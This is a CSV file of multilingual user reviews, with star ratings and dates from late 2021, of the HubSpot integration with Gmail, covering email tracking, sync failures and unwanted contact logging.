User Review,Star Rating,Date
très bien mais je cherche le SAV HubSpot pour mes questions techniques - très bien mais je cherche le SAV HubSpot pour mes questions techniques,4 of 5,Dec 8 2021
My emails are not being tracked in HubSpot even though I have tracking turned on.,2 of 5,Dec 7 2021
sync works well from all devices mobile and desktop. It's important for me to have all activities on HubSpot,5 of 5,Dec 7 2021
SuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuperSuper,5 of 5,Dec 7 2021
Gmail is fine. It does what I need from an email and a calendar. However getting the features that I value working with HS has been a challenge.,2 of 5,Dec 6 2021
Sim pois usamos o Gmail tanto para entrar em contato com novos clientes quanto para responder as pessoas que já são nossos clientes.,5 of 5,Dec 6 2021
Ca se désactive constamment. Du coup mon objectif n'est pas atteint. J'envoie des mails mais ils ne s'archivent pas,2 of 5,Dec 6 2021
Gmail is challenging when you have a long thread of emails under the same topic. There is no clear view to see what is the most updated and how threads on the email are being answered.,2 of 5,Dec 5 2021
Na minha opinião a ferramenta atende muito bem os fins propostos e o uso da ferramenta nos permite alcançar de maneira objetiva os resultados profissionais esperados.,5 of 5,Dec 5 2021
If you want to track your emails create a sophisticated CRM and leverage your Sales Pipeline I recommend this product.,5 of 5,Dec 3 2021
Easy to use great visibility in the contact and company record inside of HubSpot. A must have!,5 of 5,Dec 2 2021
Excellent for ease of use. 5 Stars across the board. I really like the 2 layer security.,5 of 5,Dec 2 2021
Excelente herramienta de apoyo diario para recibir y enviar información necesario para realizar trabajos,5 of 5,Dec 1 2021
Gmail é meu provedor padrão tem funcionado muito bem. As atualizações são bem rápidas,5 of 5,Dec 1 2021
Gmail is a great tool. I'm so glad to have it as part of my arsenal of resources!,5 of 5,Dec 1 2021
better with out HubSpot extra work to go back and forth cannot access from my phone so not want another app on my phone,1 of 5,Dec 1 2021
Its a great app but for some reason its broken for me. Does not integrate with Gmail well,3 of 5,Dec 1 2021
Me gusta que desde la aplicación se pueda crear y registrar el correo y se pueda ver el historial desde aqí al igual que se puede visualizar la aparturas clics de mis correos y los documentos que le envío,5 of 5,Nov 30 2021
Using HubSpot to track all your sales & customer emails is fantastic. Records get updated and you have a great information about your communications. The one major major issue is that you have to be really careful about tracking emails because you can end up with a pile of contacts in HubSpot that shouldn't be there. And worse you can end up with legal investor and other emails & documentation inside HubSpot for others to see. HubSpot needs to make it easier to filter out contacts that you don't want to track. It is possible to do this it just isn't easy.,2 of 5,Nov 29 2021
funciona perecto facilita mucho mi gestión diaria en el proceso de ventas .,5 of 5,Nov 29 2021
Easy to use and set up - works well. Really please with how straightforward is was to set up with Gmail (which we used already) can now easily track all communication associated with each deal,5 of 5,Nov 29 2021
working very well for us so far. We are only 2 weeks in though so there's still time :P,5 of 5,Nov 29 2021
It's working well and I will continue to use it more often with my prospects.,4 of 5,Nov 26 2021
That is none of your concern.....................................................,3 of 5,Nov 26 2021
ça marche super bien je recommande ça a changé ma vie bien entendu hahahahah,5 of 5,Nov 24 2021
Gmail est un outil facile à prendre en main et facile gérable sur plusieurs supports que ce soit le téléphone ou le PC - il a une grande accessibilité et a en plus un belle capacité de stockage de données ce qui facilite les échanges de data sans perte de qualité.,3 of 5,Nov 24 2021
this is major for seeing how the email is being received and responded to from the sender,3 of 5,Nov 24 2021
It is working well - I need to be better at using it's functionality and features.,4 of 5,Nov 24 2021
Good. However we need a better way to total the number of emails that are made on a daily weekly etc basis.,4 of 5,Nov 23 2021
L'extension Gmail HubSpot permet de suivre et d'enregistrer les échanges prospects et clients facilement. La fonction ne jamais enregistrer permet de conserver la maîtrise sur sa création de nouveaux contacts. De quoi garder son CRM propre.,5 of 5,Nov 23 2021
Extensão funcionando após instalação ajuda no processo de vendas e nosso time comercial.,5 of 5,Nov 22 2021
Was and is fairly easy to learn both tools; and to utilize different aspects of both to coordinate my daily tasks.,4 of 5,Nov 22 2021
Excelente calidad facilidad manejo sencillo alta capacidad de integración,5 of 5,Nov 22 2021
I like that I can access the CRM and assets directly from Gmail (Snippets Templates etc).,5 of 5,Nov 22 2021
Gmail me es muy funcional y práctico pero la vinculación con HubSpot no es tan sencilla de aprender sobre todo cuando no se desea que todos los correos (contactos) tengan esta vinculación,3 of 5,Nov 20 2021
It was not working. But your team put up with my fears of communications and got the job done.,5 of 5,Nov 19 2021
Funciona muy bien y permite un manejo de la informacion muy dianamico por lo tanto excelente aplicacion,5 of 5,Nov 19 2021
The integration failed to capture all emails being sent. Not able to track down why.,2 of 5,Nov 18 2021
Es fácil de manejar y muy intuitivo. Me ayuda a controlar mejor el seguimiento de mis correos y también a redactarlos de mejor forma.,5 of 5,Nov 18 2021
using Gmail I can connect all y others email accounts and and a only one view,5 of 5,Nov 18 2021
Gmail offre à ses utilisateur une facilité d'utilisation avec une multitude de fonctionnalités pratiques et gratuit.,2 of 5,Nov 17 2021
It's great and it is easy to use I am able to easily see whom opened my email and when.,4 of 5,Nov 17 2021
I have multiple email address and I am using Spark to combine it all. It also has calendar extension and now I have to use also chrome and gmail on the side.,1 of 5,Nov 17 2021
Gmail is great but for some reason even when I open my inbox I get alerts showing my recipient opened the mail.,3 of 5,Nov 17 2021
Tudo funciona mt bem porém não consigo fazer de forma fácil com que um e-mail que eu recebi por fora do HubSpot volte a ter sua cadência por aqui. Por exemplo se eu mando uma mensagem pelo Hub e copio dois destinatários porém um deles clicar em "responder só para mim",5 of 5,Nov 16 2021
I enjoy the functionality. I used calendly for years and it never worked well with other programs.,4 of 5,Nov 16 2021
Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good Good and Good.,4 of 5,Nov 16 2021
When creating a Meeting on HubSpot it not only added it to my Google Calendar but it shared it with my client's including all of my notes (that I thought would be private). To avoid this I just removed Google from HubSpot so that booking meetings on HubSpot does not email my clients. I will just manually add meetings to my Google Calendar.,1 of 5,Nov 16 2021
I have multiple Gmail addresses that fully integrate with my HubSpot account. Making it super easy to associated contacts with the various emails that get sent.,5 of 5,Nov 16 2021
HubSpot's Gmail plugin is an effective way to send and track emails to customers prospects team members and vendors. Highly recommend it.,5 of 5,Nov 16 2021
funciona bien  es fácil de usar e ingresar la es amigable con mi conexiones,5 of 5,Nov 16 2021
It is great tool to communicate with leads. Very easy to use and has lot of other tools which helps the sales people. For example Google search calendar Google meet.,5 of 5,Nov 16 2021
We are on Google Workspace so Gmail is the logical solution. It works great for us. It would be great to access my personal Gmail emails in HubSpot too like in PipeDrive. It would make answering non-shared-inbox emails so much easier in HubSpot.,4 of 5,Nov 16 2021
Working well for me and the business regarding the e-mail services will recommend to others,5 of 5,Nov 16 2021
HubSpot's integration with Gmail just doesn't stack up against many (most?) of the other sales engagement and automation platforms.,2 of 5,Nov 15 2021
[email] wants some insurance. I add him to HubSpot and can track my calls and emails to Joe. I will get other emails from [email] and [email] some of which I will want to attach to Joe or (Joes 100k policy Deal) (others of course from those same emails need to be attached to [email] or [email]) this requested feature has had good feedback in the HubSpot community boards but has not been implemented. Other than that you'll be hooked if you dip you feet in and use the product. It will help you track all those things spead between your calendar your email your sms and your call log all those things that are slipping between the cracks and losing you deals.,3 of 5,Nov 15 2021
Excelente parceria entre as empresas. Só temos a criar mais sinergia. Estamos trilhando uma jornada de inovação e tecnologia,4 of 5,Nov 13 2021
Gmail really works excellent on my business transactions. So precise on time and very helpful.,5 of 5,Nov 13 2021
Gmail is a very efficient instrument for our company. The integration with HubSpot helps managing better the relations with our clients and stay on top of everything.,5 of 5,Nov 12 2021
Die Erweiterung setzt sich "oben auf GMail" und zerstört die Nutzererfahrung an vielen Stellen. Insbesondere indem sie den Fokus klaut. Dadurch löst man aus versehen shortcuts aus und löscht mails. Sehr problematisch.,2 of 5,Nov 11 2021
Overall it has been good. Good integration with other software I am using. HubSpot experience was horrible though. It's the worst a CRM can offer.,1 of 5,Nov 11 2021
email tracking helps provide insight and clarity into past customer/prospect interactions. snippets and templates save loads of time. meeting links too! all of these features are intuitive and easy to access within Gmail.,5 of 5,Nov 10 2021
Toda nossa comunicação fica integrada a plataforma deixando o histórico das tratativas em nosso contato e/ou negócio.,5 of 5,Nov 10 2021
Es muy intuitivo y eso me gusta bastante es muy fácil de usar y no he tenido problema alguno en su uso.,4 of 5,Nov 10 2021
MUY BIEN YA QUE DA LA FACILIDAD DE COMUNICACIÓN Y ADJUNTAR FORMATOS SOLICITADOS,4 of 5,Nov 10 2021
Correcto. El tener integrado el aviso de tareas en ambas aplicaciones me hace avanzar en el día a dia.,5 of 5,Nov 10 2021
It is frustrating to me when I get error messages but I can't see what the error is. There is one error message with 5 listed reasons of why you might have received the error.,2 of 5,Nov 9 2021
Funciona muy bien para poder comunicar los correos que se envian en el uso de los recordatorios por ejemplo.,4 of 5,Nov 9 2021
HubSpot plug in shows up on gmail but the emails are not logged/synced in HubSpot.,1 of 5,Nov 9 2021
Overall is working pretty well the only thing that I find slightly troublesome is the fact that it does not remain pinged nor does it maintain the window opened for calendars for instance.,4 of 5,Nov 9 2021
Muy bien tenemos la facilidad de comunicarnos con los clientes y con nuestro equipo de una forma rápida,5 of 5,Nov 9 2021
Gmail es un aliado más que una herramienta la gran mayoría de empresas con las cuales interactuamos lo tienen y eso facilita no solo videollamadas sino también el trabajo colaborativo.,5 of 5,Nov 8 2021
If I had a choice I would dump HubSpot and get Salesforce. HubSpot has yet to be helpful to me without lots of headaches.,1 of 5,Nov 8 2021
It works well. We used some shitty program called Goldmine before (think windows outlook 2005)...,4 of 5,Nov 8 2021
Fehlerfrei manchmal gibt es Aussetzer aber das ist normal kein Server hat 100% Uptime,3 of 5,Nov 8 2021
This is a "must have" for me. All e-mail are linked to the company and the contact.,5 of 5,Nov 7 2021
Muy familiarizado con gmail y con laplataforma google suite empresarial y personal,5 of 5,Nov 6 2021
Agilidad en los procesos y facilidad de uso en los diferentes apps que tiene gmail.,5 of 5,Nov 5 2021
Gmail is mission critical for our company and my personal work life. I use it for many applications in all areas of my life.,5 of 5,Nov 5 2021
Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien Bien,4 of 5,Nov 4 2021
The overall integration works well but I suggest to integrate the tasks too,4 of 5,Nov 3 2021
Comes Easy to use and has a lot of features. Using it to track the conversation and email to lead generation. Must have for everyone!,5 of 5,Nov 3 2021
Todo el tiempo se desvincula de mi gmail. Y debo logiarme nuevamente...................,2 of 5,Nov 3 2021
C'est notre boite pro mais elle n'a pas l'air parametrable pour l'instant.,1 of 5,Nov 3 2021
The integration between Gmail and HubSpot is working extremely well thank you!,5 of 5,Nov 3 2021
It's okay but should have more features and be quicker to use. I'd like to see whether an email was opened without opening it myself.,2 of 5,Nov 3 2021
Funciona genial es una herramienta útil y muy eficaz de comunicación para los usuarios,5 of 5,Nov 2 2021
good no time to write in details................................................,5 of 5,Nov 2 2021
Nice integration overall. I like having my emails at my fingertips in HubSpot.,4 of 5,Nov 2 2021
Es una plataforma mucho más amigable y facil de usar. Facil de configurar y personalizar.,5 of 5,Nov 2 2021
HubSpot is probably the best help desk service available in the market right now and their support is awesome! The navigation is simple and easy to use. Overall a much better experience than Zendesk.,5 of 5,Nov 2 2021
Gmail is use for communication service complaints services management Lots of mail are for advertising purpose after Unsubsribe the mails are frequently comes with another titles.,2 of 5,Nov 1 2021
mi empresa asido muy funcional y mas que a hora contamos con su nueva herramienta de trabajo,5 of 5,Oct 29 2021
Gmail itself is going well -- it's not really a personal choice more that we have subscribed to Google Workspace as a business and that comes with gmail.,5 of 5,Oct 28 2021
Sim o Gmail atende a minha a necessidade por enquanto não tenho um volume de demanda.,5 of 5,Oct 28 2021
Ótima ágil e eficiente. Me ajuda no dia a dia na comunicação com novos prospects.,5 of 5,Oct 28 2021
Works well if you want all mail to be controlled by HubSpot but falls down when only some mail is to be managed - even if no mail is to be managed.,2 of 5,Oct 28 2021
Con la vinculación de Gmail y HubSpot el seguimiento con los clientes se queda guardado no importa si se contesta desde Gmail o HubSpot el seguimiento se queda guardado. Me encanta que desde Gmail esta vinculada la empresa y así puedo acceder rápidamente a la empresa en HS,5 of 5,Oct 28 2021
Browser-based email is the f-ing worst interface. Bring back command line!,1 of 5,Oct 27 2021
Sim. Com o uso do Gmail traz muita facilidade pois conseguimos ter um acesso quase único junto ao HubSpot.,5 of 5,Oct 27 2021
Estoy acostumbrada porque es mi cuenta personal adicional a que tienes todo el ecosistema de calendario reuniones y contactos. Esta integración de plataformas mejora la agilidad en las actividades diarias.,5 of 5,Oct 27 2021
Espectacular la experiencia con HubSpot. Nos ha permitido automatizar nuestro trabajo. Espero pronto unir mas herramientas del sistema.,5 of 5,Oct 26 2021
I would say is bad because I'm missing tickets from my customers. Emails do not reach HubSpot!,2 of 5,Oct 26 2021
Gmail in Google Workspace works pretty well and I love it. Itegration with HubSpot is easy set in HubSpont Email settings,5 of 5,Oct 26 2021
This is a must-use integration for HubSpot & Gmail clients. It is one of my main sales tools and a true g-d send.,5 of 5,Oct 25 2021
I love to know what the team is up to and to be able to arrange meeting and keep record of all meetings in HubSpot.,5 of 5,Oct 25 2021
It is simple to use. It is direct. easy to manage and setup in a way that works for our business.,4 of 5,Oct 25 2021
Funktioniert sehr stabil. Ich bin zufrieden. Lediglich die Erstellung von Aufgaben in Gmail direkt könnte noch etwas flexibler gestaltet sein.,5 of 5,Oct 25 2021
me parace todo lo que por el momento se haces va bastante bien. Para poder dar una valoración más concreta debo seguir aprendiendo a usar todas las funcionalidades posibles. En base a esto debep decir que los correos con tips de com usar tanto HubSpot como gmail son excelentes.,4 of 5,Oct 25 2021
Fair nothing special hard to get answers to questions help and support weak,3 of 5,Oct 22 2021
Perfeitamente não tenho o que reclamar do gmail conectado ao HubSpot. Até o momento tem me atendido demais,5 of 5,Oct 22 2021
Funciona muy bien es una excelente herramienta la cual es compatible con varias herramientas,5 of 5,Oct 22 2021
Ojalá podiera uno seleccionar qué correos son para enrutar y cuáles no. Quisiera saber también más de HubSpot ya que solo lo he usado una vez.,3 of 5,Oct 21 2021
Gmail is ok. HubSpot still trying to learn the ins and outs of it and how ity works with my Ion Capital Solutions business,3 of 5,Oct 21 2021
Gmail es una herramienta fácil de utilizar para gestión de correos. El agregar utilidades de monitoreo de comunicaciones apoya la gestión de la comunicación y diseño de estrategias a partir de la información.,4 of 5,Oct 21 2021
Buena  pero mejorable. Hay muchas funciones que no son faciles de ajustar  igual creoque la ayuda existe y no la he buscado lo suficiente,4 of 5,Oct 21 2021
No information to fix HubSpot - Gmail fix limited only to some overarching general guides. Documentation is poor. Driving our organisation crazy.,1 of 5,Oct 21 2021
0. horrible. affects negatively tremendously. no support whatsoever!!I i have been trying to get help by all means but nobody answer me. please help me asap. thanks!,1 of 5,Oct 20 2021
All working fine for my needs. Simple to use and understand when training others to use.,5 of 5,Oct 20 2021
Sim está funcionando normalmente. Muito bom esse aplicativo.. Melhor experiência,5 of 5,Oct 20 2021
This review is specifically for Gmail integration with SalesHub and not HubSpot overall. My work is done primarily within Gmail and you are not auto-alerted within Gmail in a user-friendly way. You have "open" SalesHub to see a list of relevant activities/opens/clicks etc.. instead of being able to see them in Gmail. Also the reporting features are very limited and you cannot "batch enroll" a list of leads/contacts. SalesHub caps at 50 contacts -- not very efficient... Compared to MixMax and SalesLoft -- SalesHub significantly falls short of being a sales-centric tool.,1 of 5,Oct 20 2021
Algunas funciones no se encuentran habilitadas. El espacio de la firma electronica es mayor al del cuerpo del correo,4 of 5,Oct 19 2021
Gmail and G Suite work very well for us on the whole. Only issue is deeply nested messages are not easy to work with,4 of 5,Oct 19 2021
Task reminders notifications through Gmail is a real added value compare to other CRMs (eg SalesForce),5 of 5,Oct 19 2021
Fine................................................................................,3 of 5,Oct 18 2021
In general HubSpot is a helpful tool for sales. However the Gmail integration could be more user-friendly especially (at least in my case) tagging email threads to specific projects. I'm having trouble locating the correct project. An auto-fill search feature that works is all I need. I have multiple projects per vendor/contact so that may lead to confusion.,3 of 5,Oct 18 2021
Can track notes and e-mails and any communication that was had in one spot. Makes it easier to follow up on calls as well as set up tasks...weekly,4 of 5,Oct 18 2021
excelente herramienta solución simple e intuitiva favorece el cierre de ventas,5 of 5,Oct 18 2021
Me funciona bien me da facilidades en el seguimiento de los correos dentro de la empresa.,5 of 5,Oct 18 2021
Muy bien facilita el trabajo en gran medida y ofrece una linea de conexión con los clientes. Está muy bien integrado y quizas falta poder sincronizar la firma en lugar de ponerla en cada sitio por separado,5 of 5,Oct 18 2021
Funciona bien y la incidencia ha sido muy positiva como complemento al resto de herramientas.,4 of 5,Oct 18 2021
I have a lot of ideas on how this could improve. I use it every day. It's just not everything I want it to be. It's close but its just not quite there.,3 of 5,Oct 17 2021
I have a lot of meetings and having them pop up and easy to access through slack saves a lot of clicking.,5 of 5,Oct 16 2021
Bien me está ordenando. Falta un poco de claridad en la asistencia técnica,4 of 5,Oct 15 2021
Gmail is brilliant. I love the tools and apps I can add to it to creat my workspace.,5 of 5,Oct 14 2021
It's been difficult to go from SFDC to HubSpot to be honest. the template editing is not great neither as it does not refresh,2 of 5,Oct 14 2021
The perfect application! EVERRYTHING YOU NEED IS AT THE TIP OF YOUR HANDS! I LOVE HOW IT CREATES TEMPLATES AFTER IT NOTICES YOU COPYING AND PASTING! IT IS A PHENOMENAL APP!,5 of 5,Oct 14 2021
Gmail is a bit delayed in syncing with HubSpot ( when a lead is assigned). which might be critical when a direct demo is associated to one contact.,3 of 5,Oct 14 2021
Creo que el funcionamiento es bueno y el hecho de que esté ligado a HubSpot es genial pero creo que le añadiría funciones como por ejemplo el poder incluir "tarea" en el email o poder incluir las plantillas que tenemos en HubSpot desde gmail. Estas 2 funciones estaría bien tenerlas diponibles igual que está disponible la casilla de "seguimiento".,4 of 5,Oct 14 2021
Great to be able to be in HubSpot or Gmail and move freely between the two,4 of 5,Oct 13 2021
We will never look back We are very happy with the choice we made as a business to proceed with this service.,5 of 5,Oct 13 2021
Funciona bien y me permite crecer en mi negocio.Porque con las nuevas funcionalidades se logra mas productividad.,5 of 5,Oct 13 2021
Gmail works fine. HubSpot messages end up not reaching the target audience. Why do I need 75 characters for feedback? It is terrible,1 of 5,Oct 13 2021
great CRM very extensive in capability... I am only an employee as a user and this CRM is very good at helping to guide my outbound calls and prospecting each day. Additionally- it seems great for reports that my employer needs to monitor as well.,5 of 5,Oct 12 2021
Personalmente prefiero trabajar con otro software que permita trabajar con carpetas (folders). Con el gmail trabajar y archivar con carpetas es muy incómodo porque es un árbol que se despliega con el paso del mouse en una ventana muy pequeña para mi forma de trabajo,2 of 5,Oct 12 2021
tres simple d utilisation,2 of 5,Oct 12 2021
Fine with Google Chrome G-Mail and HubSpot to connect. I would like to know how to find Schedule Task to HubSpot.,5 of 5,Oct 11 2021
Improved my sales process completely by integrating my HubSpot CRM into Gmail.,5 of 5,Oct 11 2021
Es practico de usar me sirven mucho las plantillas para enviar mensajes a los clientes,5 of 5,Oct 10 2021
IT is helping me receive more connections. I have been able to book more meetings using gmail with HubSpot than my last CRM,4 of 5,Oct 8 2021
Does not work on Mozilla Firefox. I use Firefox through choice and this contractual stitch-up means that I am having to use two different browsers at once.,2 of 5,Oct 8 2021
we do not have gmail we use microsoft,5 of 5,Oct 7 2021
Gmail and Google Docs are a daily fundamental for our small business. Add to those the ease of use of our Youtube channel and it's a huge win for us.,5 of 5,Oct 7 2021
Working really well! The automated integration makes it easy to log Emails and conversations.,5 of 5,Oct 7 2021
I'm having problems with saving the emails and attachments into the deals when I'm receiving them,3 of 5,Oct 7 2021
The Gmail integration works very well. I set it up years ago and often forget it's not just a part of Gmail!,4 of 5,Oct 6 2021
SE TRABAJA MUY BIEN CON LA PLATAFORMA Y GMAIL LA INTEGRACION ES MUY BUENA Y SENCILLA DE USAR,5 of 5,Oct 6 2021
WISELY DESIGNED VERY SENSITIVE TO GMAILVERY RICH IN DATA VERY VERY VERY GOOD,5 of 5,Oct 6 2021
Reduce time and effort on email communication data exchange tracking customer actions building a customer profile,5 of 5,Oct 6 2021
Bien. Es una buena integración me encanta enviar un mail y verlo todo en HubSpot luego,4 of 5,Oct 5 2021
buena herramienta buena herramienta buena herramienta buena herramienta buena herramienta buena herramienta.,4 of 5,Oct 5 2021
100 % perfect wont change as its important for so many features see above,5 of 5,Oct 4 2021
Random. Los contactos y las empresas no son generados sistemáticamente y eso genera desconfianza. Puede que deje de usar HubSpot.,2 of 5,Oct 4 2021
Gmail works well for us and meets all expectations. Ease of use connection to other applications pricing.,5 of 5,Oct 2 2021
Gmail is fine. HubSpot is fine. But the two don’t work together well from a phone or IPad. I have to put in a bcc or forward code to get HubSpot to log my emails sent from gmail. Also why can’t I attach a file to an email sent from HubSpot?,2 of 5,Oct 1 2021
Muy bien me ha funcionado acorde a mis necesidades tiene una buena interface.,5 of 5,Oct 1 2021
Gmail has always been great. Have never had a problem with Gmail or google products.,2 of 5,Oct 1 2021
I get multiple notifications on my phone that someone opened my emails but in many cases I know I am getting the notifications late or incorrectly. I know this because for awhile it was sending me notifications that my boyfriend was opening a email repeatedly but he said he was not. And from clients I will get like 10 notifications that they opened an email and I doubt that they opened it 10 times. And I wish that when I sent an email directly from my gmail HubSpot would let me know if someone clicked any of the links. That would be helpful.,3 of 5,Oct 1 2021
5 stars hands down. The notification and interface are stellar and easy to use and figure out.,5 of 5,Sep 30 2021
Funciona bastante bien puedo encontrar todo lo necesario con facilidad de modo a responder a la demanda de los clientes,5 of 5,Sep 30 2021
I love it the time it saves me on logging communications and emails is amazing...,5 of 5,Sep 30 2021
Not satisfied at all. Frustrated with functionality. Stopped my outreaching altogether,1 of 5,Sep 29 2021
Grateful to have this integration but much could be improved. Would like to see more automatic triggering of syncing new email chains with contacts in HubSpot (not having to remember to BCC a random email address). I'd also like to see more control over which new contacts are created in HubSpot (i.e I don't want emails to non-leads to end up in HubSpot).,2 of 5,Sep 29 2021
O gmail está funcionando muito bem pra mim tanto com agendas quanto com o calendário. Com essa integração eu diminuo o meu tempo de manuseio em tarefas repetitivas e tenho menos perdas de oportunidades em agendamentos com a facilidade do link de reuniões - e o melhor sem custo para a minha empresa que ainda é pequena e precisa desse dinheiro em outros lugares.,5 of 5,Sep 29 2021
Funciona perfectamente y la integración es muy buena . Muy fácil de usar  intuitiva. Me gusta que además notifica cuando abren un correo,5 of 5,Sep 29 2021
It is working great. It would be great if there was integration with the native mac mail system as this is what I was using but it has not been too difficult to run gmail for biofab through a web browser. it is definitely worth doing that to have the HS plug in there.,5 of 5,Sep 28 2021
I love the plugin. It is really the key feature of HubSpot for me. The min 7,4 of 5,Sep 28 2021
ITS ME NOW I havent taken the time to truly give it a shot .. This system takes time that takes me away from selling,3 of 5,Sep 27 2021
não consigo integrar o email por isso não consigo beneficiar da integração que existe entre as duas marcas,1 of 5,Sep 27 2021
Funciona bien el seguimiento y el registro de los contactos. Sin embargo de un tiempo para acá cada vez que envío un correo desde Gmail la extensión de HubSpot hace que se copie mi correo (Del cual estoy enviando) en cco y llega como copia a la bandeja de entrada lo cual es sumamente desesperante. Intenté desintalar la extención y sin ella funciona normal lo que quiere decir que es un problema de la extención de HubSpot. Intente ver en el blog de usuarios y hablar con un asesor pero no consigo la solución.... Muy triste,2 of 5,Sep 27 2021
Duas grandes ferramentas que não fico sem em meu negócio. Muito bom e útil os recursos disponíveis.,5 of 5,Sep 27 2021
Great alternative to connecting your inbox to HubSpot when you want to pick and choose what gets recorded.,5 of 5,Sep 24 2021
GMAIL funciona bem sim. o tracking de mensagens de email relacionados com tickets HubSpot e negocios abertos não funciona bem,3 of 5,Sep 24 2021
WOW so easy to use. You can easily add people to sequences use snippets and I love the open receipts that I get. If you use google just get the integration.,5 of 5,Sep 24 2021
i can access work anywhere instead of installing outlook in my personal devices,5 of 5,Sep 24 2021
Using HubSpot with Gmail is a deterrent to our business efficiency. It would behoove HubSpot to seek closer integration with other email platforms to see greater adoption from teams that must prioritize task allocation and operations through integrated communications over marketing and sales.,2 of 5,Sep 23 2021
Default option to send to HubSpot must be OFF. Instead it's by default ON thus all my personal emails also sometimes ends up in HubSpot.,1 of 5,Sep 23 2021
It's really nice. It allows me to schedule emails / sync all communication and allows me to easily change properties directly from the right side panel,5 of 5,Sep 22 2021
Efficient Great Easy to use Able to organize everything Wish Google groups was this way,5 of 5,Sep 22 2021
This combination is perfect it helps me understand what is going on with the email I sent after it left my side. :),5 of 5,Sep 22 2021
It integrates well and its a lot of improvement comparing just to couple years back esspecialy working with different accounts simultaneously,5 of 5,Sep 22 2021
una información mas eficiente xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx,5 of 5,Sep 22 2021
Gmail is not only mail program. It whole communication centre which helps keep all in one place.,4 of 5,Sep 21 2021
Mala hace cosas que no quiero que haga y no es claro como deje de hacer lo que uno no quiere,2 of 5,Sep 21 2021
It ended up creating an entire company record for the 3rd party that was not necessary and I can't cleanly merge it in with my original client record,2 of 5,Sep 21 2021
.......................................................................................,5 of 5,Sep 21 2021
It's great. Love that any communication sent is tracked on a contacts record on HubSpot,5 of 5,Sep 21 2021
xgfjfgjfghfhgfghfghfghfghfghfghdfserwersdshyjukytyuytuyfghghffgdfgddfgdsdgsdgsdfsdfsdfsdfh,5 of 5,Sep 20 2021
Emails that were recorded in early September are now missing. Can someone please find them?,1 of 5,Sep 20 2021
Gmail works great HubSpot in this instance is garbage literally it has me worrying about who received a personal email from me that would be a contact in HubSpot now up to 13 recipients when I only sent it to 4 people wtf!!!,1 of 5,Sep 20 2021
It great so far! I am getting used to it and the integration with HubSpot is really something which added more features.,4 of 5,Sep 20 2021
Its good Its goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts goodIts good,5 of 5,Sep 17 2021
NA - There was NO call from HubSpot at the arranged time....................,1 of 5,Sep 17 2021
Sometimes when I answer to an email on Gmail it doesn't sync directly with HubSpot and I have to log it manually.,3 of 5,Sep 16 2021
It has been good but the HubSpot attachement creates contacts from a person's email domain. should be an option to select an account to attach.,4 of 5,Sep 16 2021
Es la herramienta de trabajo que utilizamos en la empresa de trabajo para cotizar y estar en contacto con los clientes,1 of 5,Sep 15 2021
Very nice! I am very please with the HubSpot and Gmail integration easy to use and lots of functionality. Reliable too!,5 of 5,Sep 15 2021
Es el mail por preferencia pero no tiene ninguna diferenciación de otras . Es simplemente la que utilizamos.,3 of 5,Sep 14 2021
me funciona a la perfección no me gusta que no tenga como agrupar por carpetas mis correos y que lleguen directamente a esa carpeta los correos seleccionados eso me daría mas orden a la hora de ver mi correo.,5 of 5,Sep 14 2021
